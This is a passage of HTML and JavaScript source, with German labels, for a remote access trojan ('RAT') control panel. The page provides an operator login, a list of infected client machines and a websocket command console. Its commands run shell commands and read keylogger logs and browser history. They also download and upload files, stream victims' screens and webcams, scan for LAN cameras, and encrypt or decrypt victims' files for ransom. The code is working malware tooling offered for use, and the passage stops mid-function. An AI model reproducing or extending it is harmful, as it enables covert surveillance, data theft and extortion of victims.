<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <link rel="icon" type="image/x-icon" href="favicon.ico" />
  <title>RAT Control Panel</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    :root {
      --bg: #181c24;
      --bg-panel: #23283b;
      --text: #e6e9ef;
      --accent: #5bc0be;
      --accent2: #43d17a;
      --danger: #f44336;
      --shadow: 0 8px 32px 0 rgba(31,38,135,0.18);
      --border: #2c2f36;
      --panel-radius: 18px;
      --transition: 0.18s;
      --input-bg: #23283b;
      --input-border: #3a506b;
      --input-focus: #5bc0be;
      --input-radius: 9px;
    }
    html, body {
      height: 100%;
      min-height: 100vh;
      margin: 0;
      padding: 0;
      width: 100vw;
      box-sizing: border-box;
    }
    body {
      min-height: 100vh;
      min-width: 100vw;
      width: 100vw;
      height: 100vh;
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, var(--bg) 0%, #23283b 100%);
      color: var(--text);
      font-family: 'Segoe UI', 'Roboto', Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: stretch;
      justify-content: stretch;
      transition: background var(--transition), color var(--transition);
      box-sizing: border-box;
      overflow: hidden;
    }
    .container {
      display: flex;
      flex-direction: row;
      gap: 32px;
      margin: 0;
      width: 100vw;
      height: 100vh;
      max-width: 100vw;
      max-height: 100vh;
      box-sizing: border-box;
      align-items: stretch;
      justify-content: stretch;
    }
    .panel {
      background: var(--bg-panel);
      border-radius: var(--panel-radius);
      box-shadow: var(--shadow);
      padding: 28px 24px;
      min-width: 320px;
      max-width: 420px;
      flex: 1 1 350px;
      display: flex;
      flex-direction: column;
      margin-bottom: 0;
      transition: background var(--transition), color var(--transition);
      height: 100%;
      box-sizing: border-box;
    }
    #client-panel {
      max-width: 340px;
      min-width: 220px;
      flex: 0 0 260px;
      height: 100%;
      box-sizing: border-box;
    }
    #main-panel {
      flex: 2 1 600px;
      min-width: 400px;
      max-width: 100vw;
      height: 100%;
      box-sizing: border-box;
      display: flex;
      flex-direction: column;
    }
    h2 {
      margin-top: 0;
      margin-bottom: 18px;
      font-weight: 600;
      font-size: 1.3em;
      letter-spacing: 0.03em;
      color: var(--accent);
      border-bottom: 1px solid var(--border);
      padding-bottom: 8px;
    }
    #client-list {
      list-style: none;
      padding: 0;
      margin: 0;
      flex-grow: 1;
      overflow-y: auto;
      max-height: calc(100vh - 120px);
    }
    #client-list li {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 12px 10px;
      border-radius: 8px;
      cursor: pointer;
      margin-bottom: 7px;
      border: 1px solid transparent;
      background: var(--bg-panel);
      transition: background var(--transition), border var(--transition);
      font-size: 1.05em;
      position: relative;
    }
    #client-list li.selected, #client-list li:hover {
      background: #26324a;
      border-color: var(--accent);
    }
    .client-status-dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: var(--accent2);
      margin-right: 4px;
      box-shadow: 0 0 4px #43d17a88;
    }
    .client-os {
      width: 18px;
      height: 18px;
      margin-right: 6px;
      opacity: 0.8;
    }
    .client-tooltip {
      display: none;
      position: absolute;
      left: 110%;
      top: 0;
      background: #23283b;
      color: #fff;
      border-radius: 7px;
      padding: 8px 14px;
      font-size: 0.98em;
      box-shadow: 0 4px 16px #000a;
      z-index: 10;
      min-width: 180px;
      max-width: 320px;
      pointer-events: none;
    }
    #client-list li:hover .client-tooltip {
      display: block;
    }
    #output {
      flex-grow: 1;
      background: #181c24;
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 16px;
      font-family: "Fira Mono", "Consolas", "Courier New", monospace;
      white-space: pre-wrap;
      word-break: break-word;
      overflow-y: auto;
      margin-bottom: 14px;
      min-height: 120px;
      max-height: 260px;
      font-size: 1.07em;
      position: relative;
      box-shadow: 0 2px 12px #0002;
    }
    #copy-output {
      position: absolute;
      top: 8px;
      right: 12px;
      background: var(--accent);
      color: #fff;
      border: none;
      border-radius: 7px;
      padding: 6px 14px;
      font-size: 1em;
      cursor: pointer;
      opacity: 0.7;
      transition: opacity 0.15s;
      box-shadow: 0 2px 8px #0003;
    }
    #copy-output:hover { opacity: 1; }
    #controls {
      display: flex;
      gap: 10px;
      flex-wrap: wrap;
      margin-bottom: 10px;
      align-items: center;
      background: #23283b;
      border-radius: 12px;
      box-shadow: 0 2px 8px #0002;
      padding: 14px 16px 12px 16px;
      border: 1px solid var(--border);
    }
    #send-button {
      background: linear-gradient(90deg, #5bc0be 0%, #43d17a 100%);
      color: #fff;
      border: none;
      padding: 12px 24px;
      border-radius: 10px;
      font-size: 1.08em;
      font-weight: 600;
      cursor: pointer;
      margin-left: 8px;
      box-shadow: 0 2px 8px #0002;
      transition: background var(--transition), box-shadow var(--transition), transform 0.1s;
      letter-spacing: 0.03em;
    }
    #send-button:hover {
      background: linear-gradient(90deg, #43d17a 0%, #5bc0be 100%);
      box-shadow: 0 4px 16px #0003;
      transform: translateY(-2px) scale(1.04);
    }
    input[type="text"] {
      flex-grow: 1;
      background: var(--input-bg);
      border: 1.5px solid var(--input-border);
      color: var(--text);
      padding: 13px;
      border-radius: var(--input-radius);
      font-size: 1.08em;
      font-family: "Fira Mono", "Consolas", "Courier New", monospace;
      box-shadow: 0 2px 8px #0002;
      transition: border var(--transition), box-shadow var(--transition);
      outline: none;
      margin-bottom: 0;
    }
    input[type="text"]:focus {
      border: 2px solid var(--input-focus);
      box-shadow: 0 4px 16px #0003;
      background: #23283b;
    }
    #command-suggest {
      font-family: "Fira Mono", "Consolas", "Courier New", monospace;
      background: #181c24;
      border: 1px solid var(--border);
      border-radius: 10px;
      margin-top: 2px;
      box-shadow: 0 4px 16px #000a;
      color: #fff;
      z-index: 1000;
      max-height: 220px;
      overflow-y: auto;
    }
    #command-suggest .suggest-item {
      padding: 8px 16px;
      cursor: pointer;
      border-radius: 7px;
      transition: background 0.12s;
      display: flex;
      align-items: center;
    }
    #command-suggest .suggest-item.selected,
    #command-suggest .suggest-item:hover {
      background: #5bc0be;
      color: #fff;
    }
    #command-suggest .suggest-desc {
      margin-left: 12px;
      color: #b0b0b0;
      font-size: 0.98em;
    }
    /* --- Live Screen --- */
    #screen-canvas {
      display: block;
      margin: 0 auto;
      background: #181818;
      border-radius: 10px;
      box-shadow: 0 2px 12px #0003;
      border: 1px solid var(--border);
      max-width: 100%;
      max-height: 60vh;
      transition: box-shadow var(--transition);
      cursor: zoom-in;
      margin-top: 18px;
    }
    #screen-status {
      margin-top: 7px;
      color: #b9bbbe;
      font-size: 1em;
      text-align: center;
      letter-spacing: 0.01em;
    }
    /* --- Debug Panel --- */
    #debug-panel {
      display: none;
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100vw;
      max-height: 30vh;
      background: #181c24f0;
      color: #fff;
      font-family: "Fira Mono", monospace;
      font-size: 0.98em;
      border-top: 2px solid #5bc0be;
      z-index: 9999;
      overflow-y: auto;
      padding: 10px 18px 10px 18px;
      box-sizing: border-box;
      transition: max-height 0.2s;
    }
    #debug-toggle {
      position: fixed;
      bottom: 32px;
      right: 32px;
      background: #23283b;
      color: #5bc0be;
      border: 2px solid #5bc0be;
      border-radius: 50%;
      width: 48px;
      height: 48px;
      font-size: 1.6em;
      cursor: pointer;
      z-index: 10000;
      box-shadow: 0 2px 12px #0005;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: background 0.18s, color 0.18s;
    }
    #debug-toggle:hover {
      background: #5bc0be;
      color: #23283b;
    }
    .debug-log-entry {
      margin-bottom: 2px;
      white-space: pre-wrap;
      word-break: break-all;
    }
    .debug-log-error { color: #f44336; }
    .debug-log-info { color: #43d17a; }
    .debug-log-warn { color: #ffb300; }
    @media (max-width: 1100px) {
      .container { flex-direction: column; align-items: stretch; }
      #main-panel { max-width: 100%; }
    }
    @media (max-width: 700px) {
      .container { flex-direction: column; gap: 10px; margin: 0; }
      .panel { padding: 12px 6px; min-width: unset; }
      #main-panel { min-width: unset; }
    }
    /* --- Discord-Style Command Suggestion --- */
    #command-suggest {
      position: absolute;
      left: 0;
      top: calc(100% + 4px); /* Abstand unter das Eingabefeld */
      background: #23283b;
      color: #fff;
      border-radius: 7px;
      box-shadow: 0 4px 16px #000a;
      min-width: 220px;
      max-width: 350px;
      z-index: 1000;
      margin-top: 0;
      padding: 4px 0;
      font-size: 1em;
      display: none;
      max-height: 180px; /* Vorschlagsliste kleiner */
      overflow-y: auto;  /* Scrollbar bei vielen Vorschl√§gen */
    }
    #command-suggest .suggest-item {
      padding: 8px 16px;
      cursor: pointer;
      display: flex;
      align-items: center;
    }
    #command-suggest .suggest-item.selected,
    #command-suggest .suggest-item:hover {
      background: #5bc0be;
      color: #fff;
    }
    #command-suggest .suggest-desc {
      color: #b9bbbe;
      font-size: 0.95em;
      margin-left: 10px;
      flex: 1;
    }

    /* --- Login Overlay --- */
    #login-overlay {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      width: 100vw; height: 100vh;
      background: rgba(24,28,36,0.97);
      z-index: 10001;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: opacity 0.2s;
    }
    #login-box {
      background: #23283b;
      border-radius: 18px;
      box-shadow: 0 8px 32px 0 rgba(31,38,135,0.22);
      padding: 38px 38px 30px 38px;
      min-width: 340px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 18px;
      border: 1.5px solid #5bc0be;
      animation: fadeIn 0.5s;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.97);}
      to { opacity: 1; transform: scale(1);}
    }
    #login-box h1 {
      color: #5bc0be;
      font-size: 2em;
      margin: 0 0 10px 0;
      font-weight: 700;
      letter-spacing: 0.04em;
    }
    #login-box label {
      color: #b9bbbe;
      font-size: 1.08em;
      margin-bottom: 4px;
      align-self: flex-start;
    }
    #login-box input[type="text"],
    #login-box input[type="password"] {
      width: 100%;
      padding: 13px 12px;
      border-radius: 9px;
      border: 1.5px solid #3a506b;
      background: #181c24;
      color: #e6e9ef;
      font-size: 1.08em;
      margin-bottom: 8px;
      outline: none;
      transition: border 0.15s, box-shadow 0.15s;
      box-shadow: 0 2px 8px #0002;
    }
    #login-box input[type="text"]:focus,
    #login-box input[type="password"]:focus {
      border: 2px solid #5bc0be;
      box-shadow: 0 4px 16px #0003;
      background: #23283b;
    }
    #login-box button {
      width: 100%;
      padding: 13px 0;
      background: linear-gradient(90deg, #5bc0be 0%, #43d17a 100%);
      color: #fff;
      border: none;
      border-radius: 9px;
      font-size: 1.13em;
      font-weight: 600;
      cursor: pointer;
      margin-top: 10px;
      box-shadow: 0 2px 8px #0003;
      transition: background 0.18s, box-shadow 0.18s, transform 0.1s;
      letter-spacing: 0.03em;
    }
    #login-box button:hover {
      background: linear-gradient(90deg, #43d17a 0%, #5bc0be 100%);
      box-shadow: 0 4px 16px #0003;
      transform: translateY(-2px) scale(1.04);
    }
    #login-error {
      color: #f44336;
      font-size: 1.02em;
      margin-top: 2px;
      text-align: center;
      min-height: 22px;
    }
  </style>
</head>
<body>
  <div id="login-overlay">
    <form id="login-box" autocomplete="off">
      <h1>RAT Login</h1>
      <label for="login-user">Benutzername</label>
      <input type="text" id="login-user" name="username" autocomplete="username" required autofocus />
      <label for="login-pass">Passwort</label>
      <input type="password" id="login-pass" name="password" autocomplete="current-password" required />
      <div id="login-error"></div>
      <button type="submit">Anmelden</button>
    </form>
  </div>
  <div class="container" style="display:none;" id="main-app">
    <div id="client-panel" class="panel">
      <h2>Clients</h2>
      <ul id="client-list"></ul>
    </div>
    <div id="main-panel" class="panel">
      <div id="output">
        <button id="copy-output" title="Kopieren">üìã</button>
      </div>
      <div id="controls" style="position:relative;">
        <input
          type="text"
          id="command-input"
          placeholder="Befehle: /exec, /screenshot, /download, /history, /keylogger, /ls, /systeminfo"
          autocomplete="off"
        />
        <div id="command-suggest" role="listbox" aria-label="Befehlsvorschl√§ge"></div>
        <button id="send-button">Senden</button>
        <input type="file" id="upload-input" />
      </div>
      <div id="live-screen-area" style="display:none;">
        <canvas id="screen-canvas" tabindex="0"></canvas>
        <div id="screen-status"></div>
      </div>
    </div>
  </div>
  <button id="debug-toggle" title="Debug anzeigen/verstecken" style="display:none;">üêû</button>
  <div id="debug-panel"></div>
  <script>
    // --- Login Overlay ---
    const loginOverlay = document.getElementById('login-overlay');
    const loginBox = document.getElementById('login-box');
    const loginError = document.getElementById('login-error');
    const mainApp = document.getElementById('main-app');

    function showApp() {
      loginOverlay.style.display = "none";
      mainApp.style.display = "";
      document.getElementById('debug-toggle').style.display = "";
    }

    function setLoginError(msg) {
      loginError.textContent = msg || "";
    }

    async function doLogin(username, password) {
      try {
        const resp = await fetch("/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username, password }),
        });
        if (!resp.ok) {
          const data = await resp.json();
          throw new Error(data.error || "Login fehlgeschlagen");
        }
        const data = await resp.json();
        if (data.token) {
          localStorage.setItem("rat_login", JSON.stringify({ username, token: data.token }));
          return data.token;
        }
        throw new Error("Login fehlgeschlagen");
      } catch (e) {
        throw e;
      }
    }

    loginBox.onsubmit = async function(e) {
      e.preventDefault();
      setLoginError("");
      const username = document.getElementById('login-user').value;
      const password = document.getElementById('login-pass').value;
      try {
        const token = await doLogin(username, password);
        showApp();
        window._rat_token = token;
        window.initRatApp && window.initRatApp(token);
      } catch (err) {
        setLoginError(err.message || "Login fehlgeschlagen. Bitte √ºberpr√ºfe Benutzername und Passwort.");
      }
    };

    // --- Auto-Login, wenn Token vorhanden ---
    window.addEventListener("DOMContentLoaded", () => {
      try {
        const login = JSON.parse(localStorage.getItem("rat_login") || "{}");
        if (login && login.token) {
          showApp();
          window._rat_token = login.token;
          window.initRatApp && window.initRatApp(login.token);
        }
      } catch {}
    });
  </script>
  <script>
    // --- Globale Variablen f√ºr Client-Auswahl ---
    let selectedClientId = null;
    let selectedClient = null;

    // --- DOM ELEMENTE OBEN DEFINIEREN ---
    const commandInput = document.getElementById("command-input");
    const sendButton = document.getElementById("send-button");
    const uploadInput = document.getElementById("upload-input");
    const output = document.getElementById("output");
    const copyBtn = document.getElementById("copy-output");
    const clientList = document.getElementById("client-list");
    const screenCanvas = document.getElementById('screen-canvas');
    const screenStatus = document.getElementById('screen-status');
    const commandSuggest = document.getElementById("command-suggest");
    const liveScreenArea = document.getElementById('live-screen-area');
    const debugPanel = document.getElementById('debug-panel');
    const debugToggle = document.getElementById('debug-toggle');
    // Optional: Theme toggle, screenZoom, screenScreenshot, etc. nur wenn im HTML vorhanden
    let screenZoom = document.getElementById('screen-zoom');
    let screenScreenshot = document.getElementById('screen-screenshot');

    // --- DEBUG PANEL ---
    let debugEnabled = false;
    debugToggle.onclick = () => {
      debugEnabled = !debugEnabled;
      debugPanel.style.display = debugEnabled ? "block" : "none";
    };
    function debugLog(msg, type="info") {
      if (!debugPanel) return;
      const div = document.createElement("div");
      div.className = "debug-log-entry debug-log-" + type;
      div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
      debugPanel.appendChild(div);
      debugPanel.scrollTop = debugPanel.scrollHeight;
    }

    // --- OUTPUT COPY ---
    copyBtn.onclick = () => {
      const text = output.innerText.replace(/^üìã/, '').trim();
      navigator.clipboard.writeText(text);
      copyBtn.textContent = "‚úÖ";
      setTimeout(() => (copyBtn.textContent = "üìã"), 1200);
    };

    // --- CLIENT-LISTENFUNKTIONEN ---
    function osIcon(os) {
      if (!os) return "";
      if (os.toLowerCase().includes("windows")) return '<img class="client-os" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/windows8/windows8-original.svg" alt="Windows">';
      if (os.toLowerCase().includes("linux")) return '<img class="client-os" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linux/linux-original.svg" alt="Linux">';
      if (os.toLowerCase().includes("darwin") || os.toLowerCase().includes("mac")) return '<img class="client-os" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/apple/apple-original.svg" alt="macOS">';
      return "";
    }
    function createClientListItem(client) {
      const li = document.createElement("li");
      li.innerHTML = `<span class="client-status-dot"></span>
        ${osIcon(client.os)}
        <span>${client.hostname || "Unbekannt"}</span>
        <span style="margin-left:auto;font-size:0.97em;color:#b9bbbe;">${client.ip || (client.address ? client.address[0] : "")}</span>
        <span class="client-tooltip">
          <b>Hostname:</b> ${client.hostname || "?"}<br>
          <b>OS:</b> ${client.os || "?"}<br>
          <b>IP:</b> ${client.ip || (client.address ? client.address[0] : "")}
        </span>`;
      li.dataset.clientId = String(client.id); // immer als String
      if (String(client.id) === String(selectedClientId)) li.classList.add("selected");
      li.addEventListener("click", () => selectClient(String(client.id), client));
      return li;
    }
    function renderClientList(clients) {
      clientList.innerHTML = "";
      if (!clients.length) {
        const li = document.createElement("li");
        li.textContent = "Keine Clients verbunden.";
        li.style.color = "#b9bbbe";
        clientList.appendChild(li);
        return;
      }
      clients.forEach((client) => {
        const li = createClientListItem(client);
        clientList.appendChild(li);
      });
    }
    function selectClient(id, clientObj) {
      selectedClientId = String(id); // immer als String speichern
      selectedClient = String(id);
      document.querySelectorAll("#client-list li").forEach((el) => el.classList.remove("selected"));
      const li = clientList.querySelector(`li[data-client-id='${selectedClientId}']`);
      if (li) li.classList.add("selected");
      log(`Client ${clientObj?.hostname || id} ausgew√§hlt.`, "cmd");
      if (screenCanvas && screenCanvas.getContext) {
        screenCanvas.getContext('2d').clearRect(0, 0, screenCanvas.width, screenCanvas.height);
      }
      if (screenStatus) screenStatus.textContent = '';
    }

    // --- LOGGING ---
    function log(message, type = "info") {
      const entry = document.createElement("div");
      entry.className = `log-entry log-${type}`;
      entry.innerHTML = highlightSyntax(`[${new Date().toLocaleTimeString()}] ${message}`);
      output.appendChild(entry);
      output.scrollTop = output.scrollHeight;
      debugLog(message, type);
    }
    function highlightSyntax(text) {
      return text
        .replace(/(error|fehler)/gi, '<span style="color:#f44336;font-weight:bold">$1</span>')
        .replace(/(\$ |PS |C:\\\\|C:\/)/g, '<span style="color:#8ecae6;font-weight:bold">$1</span>');
    }

    // --- COMMAND HISTORY ---
    let cmdHistory = JSON.parse(localStorage.getItem("cmdHistory") || "[]");
    let cmdHistoryIdx = cmdHistory.length;
    commandInput.addEventListener("keydown", (e) => {
      if (e.key === "ArrowUp") {
        if (cmdHistory.length && cmdHistoryIdx > 0) {
          cmdHistoryIdx--;
          commandInput.value = cmdHistory[cmdHistoryIdx];
          e.preventDefault();
        }
      } else if (e.key === "ArrowDown") {
        if (cmdHistory.length && cmdHistoryIdx < cmdHistory.length - 1) {
          cmdHistoryIdx++;
          commandInput.value = cmdHistory[cmdHistoryIdx];
          e.preventDefault();
        } else if (cmdHistoryIdx === cmdHistory.length - 1) {
          commandInput.value = "";
          cmdHistoryIdx = cmdHistory.length;
        }
      } else if (e.key === "Tab") {
        // Tab-Vervollst√§ndigung f√ºr Slash-Befehle
        const val = commandInput.value;
        if (val.startsWith("/")) {
          const filtered = COMMANDS.filter(c =>
            c.cmd.startsWith(val) || c.cmd.replace("/", "").startsWith(val.replace("/", ""))
          );
          if (filtered.length === 1) {
            commandInput.value = filtered[0].cmd + " ";
            e.preventDefault();
          } else if (filtered.length > 1) {
            // Vervollst√§ndige bis zum l√§ngsten gemeinsamen Pr√§fix
            let prefix = filtered[0].cmd;
            for (let i = 1; i < filtered.length; i++) {
              let j = 0;
              while (j < prefix.length && prefix[j] === filtered[i].cmd[j]) j++;
              prefix = prefix.slice(0, j);
            }
            if (prefix.length > val.length) {
              commandInput.value = prefix;
              e.preventDefault();
            }
          }
        }
      }
    });

    // --- Upload-Dialog: /upload [Zielpfad] ---
    function showUploadInput(show) {
      uploadInput.style.display = show ? "inline-block" : "none";
    }
    commandInput.addEventListener("input", function () {
      const val = commandInput.value.trim();
      showUploadInput(val.startsWith("/upload"));
    });

    // Initial verstecken
    showUploadInput(false);

    // --- Chunked Upload f√ºr gro√üe Dateien ---
    const CHUNK_SIZE = 512 * 1024; // 512 KB pro Chunk

    uploadInput.addEventListener("change", function () {
      const file = uploadInput.files && uploadInput.files[0];
      if (!file) return;
      const lastUploadPath = window._lastUploadTargetPath || ".";
      if (file.size <= CHUNK_SIZE) {
        // Klein: wie bisher
        const reader = new FileReader();
        reader.onload = function (e) {
          const dataUrl = e.target.result;
          let base64 = "";
          if (typeof dataUrl === "string" && dataUrl.startsWith("data:")) {
            base64 = dataUrl.split(",")[1];
          }
          const payload = {
            action: "upload",
            filename: lastUploadPath,
            data: base64,
            is_chunked: false,
          };
          sendCommand(payload);
        };
        reader.readAsDataURL(file);
      } else {
        // Gro√ü: Chunked Upload
        chunkedUploadFile(file, lastUploadPath);
      }
      uploadInput.value = "";
    });

    function chunkedUploadFile(file, targetPath) {
      const totalChunks = Math.ceil(file.size / CHUNK_SIZE);
      let currentChunk = 0;
      let fileId = Date.now() + "_" + Math.floor(Math.random() * 1e6);
      function sendNextChunk() {
        const start = currentChunk * CHUNK_SIZE;
        const end = Math.min(start + CHUNK_SIZE, file.size);
        const blob = file.slice(start, end);
        const reader = new FileReader();
        reader.onload = function (e) {
          let base64 = "";
          const dataUrl = e.target.result;
          if (typeof dataUrl === "string" && dataUrl.startsWith("data:")) {
            base64 = dataUrl.split(",")[1];
          }
          const payload = {
            action: "upload_chunk",
            filename: targetPath,
            file_id: fileId,
            chunk_index: currentChunk,
            total_chunks: totalChunks,
            data: base64,
            is_chunked: true,
            original_filename: file.name,
            filesize: file.size,
          };
          ws.send(JSON.stringify(payload));
          log(`Chunk ${currentChunk + 1}/${totalChunks} gesendet...`, "info");
          currentChunk++;
          if (currentChunk < totalChunks) {
            setTimeout(sendNextChunk, 50); // kleine Pause, um √úberlast zu vermeiden
          } else {
            log("Alle Chunks gesendet. Warte auf Best√§tigung...", "info");
          }
        };
        reader.readAsDataURL(blob);
      }
      sendNextChunk();
    }

    // --- BEFEHL SENDEN ---
    function sendCommand(customPayload = null) {
      if (!selectedClientId) {
        log("Fehler: Kein Client ausgew√§hlt.", "error");
        debugLog("Kein Client ausgew√§hlt beim Senden", "warn");
        return;
      }
      let payload;
      const commandText = customPayload ? "" : commandInput.value.trim();
      if (!customPayload && !commandText) return;
      // --- History speichern ---
      if (!customPayload && commandText) {
        if (cmdHistory[cmdHistory.length - 1] !== commandText) {
          cmdHistory.push(commandText);
          if (cmdHistory.length > 100) cmdHistory.shift();
          localStorage.setItem("cmdHistory", JSON.stringify(cmdHistory));
        }
        cmdHistoryIdx = cmdHistory.length;
      }
      if (customPayload) {
        payload = { target_id: String(selectedClientId), ...customPayload };
      } else {
        // /upload [zielpfad]
        if (commandText.startsWith("/upload")) {
          const parts = commandText.split(" ");
          const targetPath = parts.slice(1).join(" ").trim() || ".";
          window._lastUploadTargetPath = targetPath;
          uploadInput.click();
          // Kein Senden an den Server, bis Datei gew√§hlt wurde!
          commandInput.value = "";
          hideSuggest();
          return;
        }
        // /screenstream_start und /screenstream_stop UI-Handling
        if (commandText.startsWith("/screenstream_start")) handleLiveScreenCommand("/screenstream_start");
        if (commandText.startsWith("/screenstream_stop")) handleLiveScreenCommand("/screenstream_stop");
        if (commandText.startsWith("/webcam_start")) handleWebcamCommand("/webcam_start");
        if (commandText.startsWith("/webcam_stop")) handleWebcamCommand("/webcam_stop");
        let slashPayload = parseSlashCommand(commandText);
        if (slashPayload && slashPayload.action) {
          payload = { target_id: String(selectedClientId), ...slashPayload };
        } else {
          const parts = commandText.split(" ");
          const action = parts[0].toLowerCase();
          const argument = parts.slice(1).join(" ");
          payload = {
            target_id: String(selectedClientId),
            action: action,
          };
          if (action === "screenstream_start") handleLiveScreenCommand("/screenstream_start");
          if (action === "screenstream_stop") handleLiveScreenCommand("/screenstream_stop");
          switch (action) {
            case "exec":
              payload.command = argument;
              break;
            case "download":
              payload.path = argument;
              break;
            case "history":
              payload.limit = parseInt(argument) || 20;
              break;
            case "keylogger":
              payload.count = parseInt(argument) || 50;
              break;
            case "ls":
              payload.path = argument || ".";
              break;
            case "cd":
              payload.path = argument || ".";
              break;
            case "encrypt":
              payload.path = argument || ".";
              break;
            case "decrypt": {
              const [path, key_hex] = argument.split(" ");
              payload.path = path || ".";
              payload.key_hex = key_hex || "";
              break;
            }
            case "screenshot":
            case "systeminfo":
            case "shutdown":
            case "restart":
            case "screenstream_start":
            case "screenstream_stop":
            case "help":
              break;
            default:
              // Unbekannter Befehl: trotzdem senden
              payload.argument = argument;
          }
        }
      }
      ws.send(JSON.stringify(payload));
      log(
        `Befehl gesendet: ${payload.action || "(unbekannt)"}${
          payload.command ? " " + payload.command : payload.path ? " " + payload.path : payload.argument ? " " + payload.argument : ""
        }`,
        "cmd"
      );
      debugLog("Befehl gesendet: " + JSON.stringify(payload), "info");
      if (!customPayload) {
        commandInput.value = "";
        hideSuggest();
      }
    }

    // --- Slash-Befehle f√ºr Suggestion ---
    const COMMANDS = [
      { cmd: "/help", desc: "Zeigt die Hilfe an" },
      { cmd: "/exec", desc: "F√ºhre einen Shell-Befehl aus" },
      { cmd: "/screenshot", desc: "Screenshot des Bildschirms" },
      { cmd: "/download", desc: "Datei herunterladen (Pfad angeben)" },
      { cmd: "/upload", desc: "Datei zum Client hochladen" },
      { cmd: "/history", desc: "Browserverlauf anzeigen" },
      { cmd: "/keylogger", desc: "Keylogger-Log anzeigen" },
      { cmd: "/ls", desc: "Verzeichnis auflisten" },
      { cmd: "/cd", desc: "Wechsle das Verzeichnis" },
      { cmd: "/encrypt", desc: "Datei/Verzeichnis verschl√ºsseln" },
      { cmd: "/decrypt", desc: "Datei/Verzeichnis entschl√ºsseln" },
      { cmd: "/systeminfo", desc: "Systeminformationen anzeigen" },
      { cmd: "/shutdown", desc: "Client herunterfahren" },
      { cmd: "/restart", desc: "Client neustarten" },
      { cmd: "/screenstream_start", desc: "Live-Screen starten" },
      { cmd: "/screenstream_stop", desc: "Live-Screen stoppen" },
      { cmd: "/scan_cameras", desc: "Suche nach Netzwerk-Kameras im LAN" },
      { cmd: "/webcam_start", desc: "Live-Webcam-Stream starten" },
      { cmd: "/webcam_stop", desc: "Live-Webcam-Stream stoppen" }
    ];

    let suggestIdx = 0;
    function showSuggest() {
      const val = commandInput.value;
      if (!val.startsWith("/")) {
        commandSuggest.style.display = "none";
        return;
      }
      const query = val.slice(1).toLowerCase();
      const filtered = COMMANDS.filter(cmd => cmd.cmd.slice(1).startsWith(query));
      commandSuggest.innerHTML = "";
      if (filtered.length === 0) {
        commandSuggest.style.display = "none";
        return;
      }
      filtered.forEach((cmd, idx) => {
        const li = document.createElement("div");
        li.className = "suggest-item" + (idx === suggestIdx ? " selected" : "");
        li.textContent = cmd.cmd;
        const desc = document.createElement("span");
        desc.className = "suggest-desc";
        desc.textContent = cmd.desc;
        li.appendChild(desc);
        li.onmouseenter = () => {
          suggestIdx = idx;
          updateSuggestHighlight();
        };
        li.onmousedown = (e) => {
          e.preventDefault();
          commandInput.value = cmd.cmd + " ";
          commandInput.focus();
          hideSuggest();
        };
        commandSuggest.appendChild(li);
      });
      commandSuggest.style.display = "block";
      updateSuggestHighlight();
    }
    function hideSuggest() {
      commandSuggest.style.display = "none";
    }
    function updateSuggestHighlight() {
      Array.from(commandSuggest.children).forEach((el, idx) => {
        el.classList.toggle("selected", idx === suggestIdx);
      });
    }
    commandInput.addEventListener("input", showSuggest);
    commandInput.addEventListener("focus", showSuggest);
    commandInput.addEventListener("blur", () => setTimeout(hideSuggest, 120));
    commandInput.addEventListener("keydown", (e) => {
      const val = commandInput.value;
      const filtered = COMMANDS.filter(cmd => cmd.cmd.slice(1).startsWith(val.slice(1).toLowerCase()));
      if (commandSuggest.style.display === "block" && filtered.length > 0) {
        if (e.key === "ArrowDown") {
          suggestIdx = Math.min(suggestIdx + 1, filtered.length - 1);
          updateSuggestHighlight();
          e.preventDefault();
        } else if (e.key === "ArrowUp") {
          suggestIdx = Math.max(suggestIdx - 1, 0);
          updateSuggestHighlight();
          e.preventDefault();
        } else if (e.key === "Tab" || e.key === "Enter") {
          commandInput.value = filtered[suggestIdx].cmd + " ";
          commandInput.focus();
          hideSuggest();
          e.preventDefault();
        } else if (e.key === "Escape") {
          hideSuggest();
        }
      }
    });

    // --- parseSlashCommand: robust f√ºr alle /-Befehle ---
    function parseSlashCommand(cmdText) {
      if (typeof cmdText !== "string" || !cmdText.startsWith("/")) return null;
      const [slash, ...args] = cmdText.trim().split(" ");
      const action = slash.replace("/", "");
      // Spezialfall: encrypt/decrypt mit Pfad und Key
      if (action === "encrypt") {
        return { action, path: args.join(" ") || "." };
      }
      if (action === "decrypt") {
        if (args.length < 2) return { action, path: args.join(" ") || ".", key_hex: "" };
        const key_hex = args[args.length - 1];
        const path = args.slice(0, -1).join(" ") || ".";
        return { action, path, key_hex };
      }
      const argument = args.join(" ");
      switch (action) {
        case "exec":
          return { action, command: argument };
        case "download":
          return { action, path: argument };
        case "upload":
          return { action };
        case "history":
          return { action, limit: parseInt(argument) || 20 };
        case "keylogger":
          return { action, count: parseInt(argument) || 50 };
        case "ls":
          return { action, path: argument || "." };
        case "cd":
          return { action, path: argument || "." };
        case "screenshot":
        case "systeminfo":
        case "shutdown":
        case "restart":
        case "screenstream_start":
        case "screenstream_stop":
        case "scan_cameras":
        case "webcam_start":
        case "webcam_stop":
        case "help":
          return { action };
        default:
          return { action, argument };
      }
    }

    // --- Live-Screen-Kommandos: UI-Statusanzeige und Bereich ein-/ausblenden ---
    function handleLiveScreenCommand(cmd) {
      if (!liveScreenArea) return;
      if (cmd === "/screenstream_start" || cmd === "screenstream_start") {
        liveScreenArea.style.display = "";
        if (screenStatus) screenStatus.textContent = "Live-Bild wird gestartet...";
      } else if (cmd === "/screenstream_stop" || cmd === "screenstream_stop") {
        liveScreenArea.style.display = "none";
        if (screenCanvas && screenCanvas.getContext) {
